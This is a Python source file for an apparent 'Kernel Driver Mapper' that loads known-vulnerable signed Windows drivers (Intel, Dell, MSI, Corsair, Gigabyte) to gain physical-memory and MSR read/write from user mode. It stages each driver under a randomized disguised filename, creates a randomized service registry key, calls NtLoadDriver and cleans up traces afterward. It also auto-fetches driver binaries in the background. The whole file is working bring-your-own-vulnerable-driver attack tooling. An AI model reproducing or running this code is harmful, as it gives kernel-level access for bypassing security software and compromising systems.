"""
BIFROST SDK — Kernel Driver Mapper
Handles loading, verification, and cleanup of vulnerable signed drivers.

Supported drivers:
  - iqvw64e.sys (Intel Network Adapter Diagnostic Driver)
  - dbutil_2_3.sys (Dell BIOS Utility Driver)
  - RTCore64.sys (MSI Afterburner driver)
"""

from __future__ import annotations

import ctypes
import ctypes.wintypes as wt
import hashlib
import os
import shutil
import struct
import sys
import time
import winreg
from dataclasses import dataclass
from enum import Enum, auto
from pathlib import Path
from typing import Optional

k32 = ctypes.windll.kernel32
advapi32 = ctypes.windll.advapi32
ntdll = ctypes.windll.ntdll

class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length", wt.USHORT),
        ("MaximumLength", wt.USHORT),
        ("Buffer", wt.LPWSTR),
    ]

class DriverType(Enum):
    INTEL_NAL = auto()
    DELL_DBUTIL = auto()
    MSI_RTCORE = auto()
    DELL_WDT = auto()
    CORSAIR_LL = auto()
    GIGABYTE_GIO = auto()
    CUSTOM = auto()

@dataclass
class DriverProfile:
    """Known driver configuration."""
    driver_type: DriverType
    filename: str
    service_name: str
    device_path: str
    known_hashes: list[str]
    ioctl_read: int
    ioctl_write: int
    supports_phys_map: bool = True
    driver_path: str = ""  # Set during load() to the staged path

DRIVER_PROFILES: dict[str, DriverProfile] = {
    "intel": DriverProfile(
        driver_type=DriverType.INTEL_NAL,
        filename="iqvw64e.sys",
        service_name="NalDrv",
        device_path=r"\\.\Nal",
        known_hashes=[
            "d04e5db5b6c848a29732bfd52029001f23c3da09b7a6b87e8f73cbba4b74",
            "4429f32db1cc70567919d7d47b844a91cf1329a6cd116f582305f3b7b60cd60b",
        ],
        ioctl_read=0x80862007,
        ioctl_write=0x80862008,
    ),
    "dell": DriverProfile(
        driver_type=DriverType.DELL_DBUTIL,
        filename="dbutil_2_3.sys",
        service_name="DBUtil_2_3",
        device_path=r"\\.\DBUtil_2_3",
        known_hashes=[
            "c948ae14761095e4d76b55d9de86412258be7afd8017f0cf00",
            "0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5",
        ],
        ioctl_read=0x9B0C1EC4,
        ioctl_write=0x9B0C1EC8,
    ),
    "msi": DriverProfile(
        driver_type=DriverType.MSI_RTCORE,
        filename="RTCore64.sys",
        service_name="RTCore64",
        device_path=r"\\.\RTCore64",
        known_hashes=[
            "01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862",
            "01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd",
            "f1c8ca232789c2f11a511c8cd95a9f3830dd719cad5aa22cb7c3539ab8cb4dc3",
        ],
        ioctl_read=0x80002048,
        ioctl_write=0x8000204C,
    ),
    # ---- NEW: Dell Watchdog Timer Kernel Driver (WHQL signed) ----
    # CVE: N/A (unpatched), MmMapIoSpace with zero validation
    # Source: Dell WDT utility, LOLDrivers issue #290
    "dell_wdt": DriverProfile(
        driver_type=DriverType.DELL_WDT,
        filename="WDTKernel.sys",
        service_name="WDTKernel",
        device_path=r"\\.\__WDT__",
        known_hashes=[
            "0e27bec347ca0050c455467bd8d774175c503b8aa1af3411e94966f7dc6b28b7",
        ],
        ioctl_read=0x9C412400,   # Read DWORD at physical address
        ioctl_write=0x9C41240C,  # Write DWORD at physical address
    ),
    # ---- NEW: Corsair iCUE Low-Level Access (WHQL signed) ----
    # Exposes MmMapIoSpace + MmMapLockedPagesSpecifyCache to usermode
    # Also has unrestricted MSR read/write (rdmsr/wrmsr)
    # Source: Corsair iCUE / Corsair Link, LOLDrivers issue #302
    "corsair": DriverProfile(
        driver_type=DriverType.CORSAIR_LL,
        filename="CorsairLLAccess64.sys",
        service_name="CorsairLLAccess",
        device_path=r"\\.\CorsairLLAccess",
        known_hashes=[
            "01e024d3c76fb1b71851ab7761afbee23159d6e8cbf7f5f1d5052efca2f7756d",
        ],
        ioctl_read=0x229350,   # MMIO Read (1/2/4 bytes via MmMapIoSpace)
        ioctl_write=0x22934c,  # MMIO Write (1/2/4 bytes via MmMapIoSpace)
    ),
    # ---- NEW: Gigabyte GIO Driver (VeriSign signed) ----
    # CVE-2018-19320/19321/19322/19323
    # Exposes ring0 memcpy, physical memory R/W, MSR R/W, IO port R/W
    # Source: GIGABYTE APP Center / AORUS GRAPHICS ENGINE, LOLDrivers
    "gigabyte": DriverProfile(
        driver_type=DriverType.GIGABYTE_GIO,
        filename="gdrv.sys",
        service_name="GDrv",
        device_path=r"\\.\GIO",
        known_hashes=[
            "31f4cfb4c71da44120752721103a16512444c13c2ac2d857a7e6f13cb679b427",
            "ff6729518a380bf57f1bc6f1ec0aa7f3012e1618b8d9b0f31a61d299ee2b4339",
            "88992ddcb9aaedb8bfcc9b4354138d1f7b0d7dddb9e7fcc28590f27824bee5c3",
        ],
        ioctl_read=0xC3502004,   # Ring0 memcpy physical read
        ioctl_write=0xC3502008,  # Ring0 memcpy physical write
    ),
}

def enable_privilege(privilege_name: str) -> bool:
    """Enable a specific token privilege for the current process."""
    # Set explicit argtypes to handle 64-bit pointers correctly
    k32.GetCurrentProcess.restype = wt.HANDLE
    advapi32.OpenProcessToken.argtypes = [wt.HANDLE, wt.DWORD, ctypes.POINTER(wt.HANDLE)]
    advapi32.AdjustTokenPrivileges.argtypes = [wt.HANDLE, wt.BOOL, ctypes.c_void_p, wt.DWORD, ctypes.c_void_p, ctypes.c_void_p]

    current_process = k32.GetCurrentProcess()
    token = wt.HANDLE()
    
    # TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
    if not advapi32.OpenProcessToken(current_process, 0x0020 | 0x0008, ctypes.byref(token)):
        return False

    class LUID(ctypes.Structure):
        _fields_ = [("LowPart", wt.DWORD), ("HighPart", wt.LONG)]

    luid = LUID()
    if not advapi32.LookupPrivilegeValueW(None, privilege_name, ctypes.byref(luid)):
        k32.CloseHandle(token)
        return False

    class LUID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [("Luid", LUID), ("Attributes", wt.DWORD)]

    class TOKEN_PRIVILEGES(ctypes.Structure):
        _fields_ = [("PrivilegeCount", wt.DWORD), ("Privileges", LUID_AND_ATTRIBUTES * 1)]

    tp = TOKEN_PRIVILEGES()
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    tp.Privileges[0].Attributes = 0x00000002  # SE_PRIVILEGE_ENABLED

    k32.SetLastError(0)
    success = advapi32.AdjustTokenPrivileges(token, False, ctypes.byref(tp), ctypes.sizeof(tp), None, None)
    err = k32.GetLastError()
    k32.CloseHandle(token)
    return (success != 0 and err == 0)

class DriverMapper:
    def __init__(self, drivers_dir: Optional[str] = None):
        if drivers_dir is None:
            if getattr(sys, "frozen", False):
                # Frozen: drivers ship next to the exe (gui/extra -> app root).
                drivers_dir = os.path.join(os.path.dirname(sys.executable), "drivers")
            else:
                drivers_dir = os.path.dirname(os.path.abspath(__file__))
        self._drivers_dir = drivers_dir
        self._profile: Optional[DriverProfile] = None
        self._device_handle: int = 0
        self._staged_path: str = ""
        self._registry_path: str = ""
        self._nt_path: str = ""

        # Auto-fetch missing drivers in a background thread. fetch_all can
        # take 30s+ on a slow link; blocking DriverInterface.__init__ would
        # stall the whole serial IPC dispatch loop.
        try:
            import threading
            from drivers.fetcher import DriverFetcher

            def _background_fetch():
                try:
                    f = DriverFetcher(self._drivers_dir)
                    f.fetch_all()
                except Exception as e:
                    print(f"[!] Driver auto-fetch failed: {e}")

            threading.Thread(target=_background_fetch, daemon=True).start()
        except Exception as e:
            print(f"[!] Driver auto-fetch skipped: {e}")

    @property
    def device_handle(self) -> int:
        return self._device_handle

    @property
    def is_loaded(self) -> bool:
        return self._device_handle != 0

    @property
    def profile(self) -> Optional[DriverProfile]:
        return self._profile

    def find_available_driver(self) -> Optional[str]:
        for key, profile in DRIVER_PROFILES.items():
            path = os.path.join(self._drivers_dir, profile.filename)
            if os.path.isfile(path):
                return key
        return None

    def list_available(self) -> list[str]:
        available = []
        for key, profile in DRIVER_PROFILES.items():
            path = os.path.join(self._drivers_dir, profile.filename)
            if os.path.isfile(path):
                available.append(key)
        return available

    def load(self, driver_key: Optional[str] = None, force: bool = False) -> bool:
        if driver_key is None:
            driver_key = self.find_available_driver()
            if driver_key is None:
                raise FileNotFoundError(f"No supported driver found in {self._drivers_dir}.")

        if driver_key not in DRIVER_PROFILES:
            raise ValueError(f"Unknown driver key: {driver_key}")

        self._profile = DRIVER_PROFILES[driver_key]
        source_path = os.path.join(self._drivers_dir, self._profile.filename)

        if not os.path.isfile(source_path):
            raise FileNotFoundError(f"Driver binary not found: {source_path}")

        if not force:
            self._validate_hash(source_path)

        if not enable_privilege("SeLoadDriverPrivilege"):
            print("[!] Warning: Could not enable SeLoadDriverPrivilege. Must run as Administrator.")

        self._staged_path = self._stage_driver(source_path)
        self._profile.driver_path = self._staged_path
        self._create_registry_service()
        self._load_driver_nt()
        self._open_device()
        return True

    def _validate_hash(self, path: str):
        """
        Fail-closed hash verification: the file must match one of the profile's
        known-good SHA256 hashes in full, otherwise loading aborts. A tool that
        maps kernel drivers is the wrong place for prefix matching or
        warn-but-continue behavior.
        """
        with open(path, "rb") as f:
            file_hash = hashlib.sha256(f.read()).hexdigest()

        if self._profile and self._profile.known_hashes:
            for known in self._profile.known_hashes:
                if len(known) == 64 and file_hash == known:
                    return
            raise RuntimeError(
                f"Driver hash mismatch for {self._profile.filename}: "
                f"expected one of {self._profile.known_hashes}, "
                f"got {file_hash}. Pass force=True to load anyway."
            )

    def _stage_driver(self, source: str) -> str:
        import random, string
        rand_suffix = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
        staged_name = f"wdf{rand_suffix}.sys"
        staged_dir = os.path.join(os.environ.get("SYSTEMROOT", r"C:\Windows"), "Temp")
        staged_path = os.path.join(staged_dir, staged_name)

        try:
            shutil.copy2(source, staged_path)
        except PermissionError:
            staged_dir = os.environ.get("TEMP", os.path.expanduser("~"))
            staged_path = os.path.join(staged_dir, staged_name)
            shutil.copy2(source, staged_path)

        return staged_path

    def _create_registry_service(self):
        import random, string
        rand = "".join(random.choices(string.ascii_lowercase, k=4))
        service_name = f"{self._profile.service_name}{rand}"
        self._profile.service_name = service_name

        self._registry_path = rf"System\CurrentControlSet\Services\{service_name}"
        self._nt_path = f"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{service_name}"
        
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, self._registry_path)
            
            # Format path for NT: \??\C:\Windows\Temp\wdfXXX.sys
            dos_path = f"\\??\\{self._staged_path}"
            
            winreg.SetValueEx(key, "ImagePath", 0, winreg.REG_EXPAND_SZ, dos_path)
            winreg.SetValueEx(key, "Type", 0, winreg.REG_DWORD, 1) # SERVICE_KERNEL_DRIVER
            winreg.SetValueEx(key, "ErrorControl", 0, winreg.REG_DWORD, 0) # SERVICE_ERROR_IGNORE
            winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 3) # SERVICE_DEMAND_START
            winreg.CloseKey(key)
        except Exception as e:
            raise OSError(f"Failed to create driver registry keys: {e}")

    def _load_driver_nt(self):
        ntdll.NtLoadDriver.argtypes = [ctypes.POINTER(UNICODE_STRING)]
        ntdll.NtLoadDriver.restype = wt.LONG
        
        path_buffer = ctypes.create_unicode_buffer(self._nt_path)
        us = UNICODE_STRING()
        us.Length = len(self._nt_path) * 2
        us.MaximumLength = (len(self._nt_path) + 1) * 2
        us.Buffer = ctypes.cast(path_buffer, wt.LPWSTR)
        
        status = ntdll.NtLoadDriver(ctypes.byref(us))
        if status != 0 and (status & 0xFFFFFFFF) != 0xC0000035:
            raise OSError(f"NtLoadDriver failed with NTSTATUS: {hex(status & 0xFFFFFFFF)}")

    def _open_device(self):
        time.sleep(0.1)
        handle = k32.CreateFileW(
            self._profile.device_path,
            0x80000000 | 0x40000000,
            0, None, 3, 0x80, None,
        )

        if handle == -1 or handle == 0xFFFFFFFF:
            raise OSError(f"Cannot open device {self._profile.device_path}. Driver may not have loaded correctly.")

        self._device_handle = handle

    def unload(self):
        if self._device_handle:
            k32.CloseHandle(self._device_handle)
            self._device_handle = 0

        if self._nt_path:
            try:
                ntdll.NtUnloadDriver.argtypes = [ctypes.POINTER(UNICODE_STRING)]
                ntdll.NtUnloadDriver.restype = wt.LONG
                
                path_buffer = ctypes.create_unicode_buffer(self._nt_path)
                us = UNICODE_STRING()
                us.Length = len(self._nt_path) * 2
                us.MaximumLength = (len(self._nt_path) + 1) * 2
                us.Buffer = ctypes.cast(path_buffer, wt.LPWSTR)
                
                ntdll.NtUnloadDriver(ctypes.byref(us))
            except Exception:
                pass

        if self._registry_path:
            try:
                winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, self._registry_path)
            except Exception:
                pass
            self._registry_path = ""
            self._nt_path = ""

        if self._staged_path and os.path.isfile(self._staged_path):
            try:
                # Try immediate deletion
                os.remove(self._staged_path)
            except Exception:
                # If locked, mark for deletion on reboot (MOVEFILE_DELAY_UNTIL_REBOOT = 4)
                try:
                    k32.MoveFileExW(self._staged_path, None, 4)
                except Exception:
                    pass
            self._staged_path = ""

    def ioctl(self, code: int, in_buf: bytes, out_size: int = 0) -> bytes:
        if not self._device_handle:
            raise RuntimeError("Driver not loaded")

        in_ct = (ctypes.c_byte * len(in_buf))(*in_buf)
        out_ct = (ctypes.c_byte * out_size)() if out_size > 0 else None
        bytes_returned = wt.DWORD(0)

        success = k32.DeviceIoControl(
            self._device_handle, code,
            ctypes.byref(in_ct), len(in_buf),
            ctypes.byref(out_ct) if out_ct else None, out_size,
            ctypes.byref(bytes_returned), None,
        )

        if not success:
            raise OSError(f"DeviceIoControl failed: code=0x{code:X}, err={k32.GetLastError()}")

        if out_ct:
            return bytes(out_ct[:bytes_returned.value])
        return b""

    def __enter__(self):
        self.load()
        return self

    def __exit__(self, *_):
        self.unload()

    def __del__(self):
        if self.is_loaded:
            try:
                self.unload()
            except Exception:
                pass
